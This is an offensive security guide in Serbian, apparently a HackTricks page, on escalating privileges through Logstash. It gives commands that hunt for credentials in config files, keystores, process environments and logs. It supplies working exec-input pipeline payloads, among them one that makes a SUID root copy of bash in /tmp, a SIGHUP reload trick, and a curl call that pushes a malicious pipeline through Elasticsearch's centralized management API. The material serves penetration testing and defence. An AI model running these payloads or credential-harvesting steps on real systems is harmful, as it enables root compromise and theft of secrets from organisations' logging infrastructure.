# Eskalacija privilegija u Logstash-u

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se koristi za **prikupljanje, transformaciju i prosleđivanje logova** kroz sistem poznat kao **pipelines**. Ovi pipelines se sastoje od faza **input**, **filter** i **output**. Zanimljiv aspekt javlja se kada Logstash radi na kompromitovanoj mašini.

### Konfiguracija Pipeline-a

Pipelines se konfigurišu u datoteci **/etc/logstash/pipelines.yml**, koja navodi lokacije konfiguracija pipeline-a:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ovaj fajl otkriva gde se nalaze **.conf** fajlovi koji sadrže konfiguracije pipeline-a. Kada se koristi **Elasticsearch output module**, uobičajeno je da **pipeline-i** sadrže **Elasticsearch credentials**, koji često imaju široke privilegije zbog potrebe Logstash-a da upisuje podatke u Elasticsearch. Wildcards u putanjama konfiguracije omogućavaju Logstash-u da izvrši sve pipeline-e koji se podudaraju u određenom direktorijumu.

Ako se Logstash pokrene sa `-f <directory>` umesto sa `pipelines.yml`, **svi fajlovi unutar tog direktorijuma se konkateniraju po leksikografskom redosledu i parsiraju kao jedna konfiguracija**. Ovo stvara 2 ofanzivne implikacije:

- Dodat fajl poput `000-input.conf` ili `zzz-output.conf` može promeniti način na koji se konačni pipeline sklapa
- Neispravan fajl može sprečiti učitavanje celog pipeline-a, zato pažljivo validirajte payload-e pre oslanjanja na auto-reload

### Brza enumeracija na kompromitovanom hostu

Na sistemu na kom je Logstash instaliran, brzo proverite:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Takođe proverite da li je lokalni monitoring API dostupan. Podrazumevano osluškuje na **127.0.0.1:9600**, što je obično dovoljno nakon ostvarivanja pristupa hostu:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Ovo vam obično daje ID-jeve pipeline-ova, detalje o runtime-u i potvrdu da je vaš izmenjeni pipeline učitan.

Credentials pronađeni u Logstash-u često otključavaju **Elasticsearch**, zato pogledajte [ovu drugu stranicu o Elasticsearch-u](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation putem Writable Pipelines

Da biste pokušali privilege escalation, prvo identifikujte korisnika pod kojim Logstash servis radi, što je obično korisnik **logstash**. Uverite se da ispunjavate **jedan** od sledećih kriterijuma:

- Imate **write access** nad pipeline **.conf** fajlom **ili**
- Fajl **/etc/logstash/pipelines.yml** koristi wildcard, a vi možete da pišete u ciljnu fasciklu

Pored toga, mora biti ispunjen **jedan** od sledećih uslova:

- Možete da restartujete Logstash servis **ili**
- U fajlu **/etc/logstash/logstash.yml** podešeno je **config.reload.automatic: true**

Ako konfiguracija sadrži wildcard, kreiranje fajla koji odgovara tom wildcard-u omogućava izvršavanje komandi. Na primer:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Ovde **interval** određuje učestalost izvršavanja u sekundama. U datom primeru, komanda **whoami** se izvršava svakih 120 sekundi, a njen izlaz se upisuje u **/tmp/output.log**.

Sa **config.reload.automatic: true** u **/etc/logstash/logstash.yml**, Logstash će automatski detektovati i primeniti nove ili izmenjene pipeline konfiguracije bez potrebe za restartovanjem.<sup>[[1]](#references)</sup> Ako nema wildcard-a, izmene se i dalje mogu izvršiti u postojećim konfiguracijama, ali se preporučuje oprez kako bi se izbegli prekidi.

### Pouzdaniji Pipeline Payload-i

`exec` input plugin i dalje funkcioniše u aktuelnim izdanjima i zahteva ili **interval** ili **schedule**. On izvršava payload tako što radi **forking** Logstash JVM-a, pa ako je memorija ograničena, vaš payload može da ne uspe sa greškom `ENOMEM` umesto da se neprimetno izvršava.

Praktičniji privilege-escalation payload obično je onaj koji ostavlja trajni artefakt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Ako nemate prava za ponovno pokretanje, ali možete da pošaljete signal procesu, Logstash takođe podržava ponovno učitavanje pokrenuto signalom **SIGHUP** na Unix-like sistemima:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Imajte na umu da nije svaki plugin kompatibilan sa ponovnim učitavanjem. Na primer, ulaz **stdin** sprečava automatsko ponovno učitavanje, zato nemojte pretpostaviti da će `config.reload.automatic` uvek preuzeti vaše izmene.<sup>[[1]](#references)</sup>

### Krađa tajni iz Logstash-a

Pre nego što se usredsredite isključivo na izvršavanje koda, prikupite podatke kojima Logstash već ima pristup:

- Kredencijali u plain text-u često su hardkodovani unutar izlaza `elasticsearch {}`, `http_poller`, JDBC inputa ili podešavanja povezanih sa cloud-om
- Secure settings mogu da se nalaze u **`/etc/logstash/logstash.keystore`** ili drugom `path.settings` direktorijumu
- Lozinka keystore-a se često prosleđuje kroz **`LOGSTASH_KEYSTORE_PASS`**, a instalacije zasnovane na paketima je obično preuzimaju iz **`/etc/sysconfig/logstash`**
- Proširivanje environment varijabli pomoću `${VAR}` rešava se pri pokretanju Logstash-a, zato vredi proveriti environment servisa

Korisne provere:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Ovo takođe vredi proveriti jer je **CVE-2023-46672** pokazao da Logstash u određenim okolnostima može beležiti osetljive informacije u logovima. Na post-exploitation hostu, stari Logstash logovi i `journald` zapisi zato mogu otkriti kredencijale čak i ako se u trenutnoj konfiguraciji koristi keystore umesto čuvanja tajni direktno u konfiguraciji.<sup>[[3]](#references)</sup>

### Zloupotreba centralizovanog upravljanja pipeline-ovima

U nekim okruženjima host se uopšte **ne oslanja** na lokalne `.conf` fajlove. Ako je podešeno **`xpack.management.enabled: true`**, Logstash može preuzimati centralno upravljane pipeline-ove iz Elasticsearch/Kibana, a nakon omogućavanja ovog režima lokalne pipeline konfiguracije više nisu source of truth.<sup>[[2]](#references)</sup>

To znači da postoji drugačiji attack path:

1. Preuzmite Elastic kredencijale iz lokalnih Logstash podešavanja, keystore-a ili logova
2. Proverite da li nalog ima **`manage_logstash_pipelines`** cluster privilege
3. Kreirajte ili zamenite centralno upravljani pipeline tako da Logstash host izvrši vaš payload tokom sledećeg poll intervala

Elasticsearch API koji se koristi za ovu funkciju je:<sup>[[2]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Ovo je naročito korisno kada su lokalne datoteke read-only, ali je Logstash već registrovan za udaljeno preuzimanje pipelines.

## Reference

- [1] [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)

{{#include ../../banners/hacktricks-training.md}}
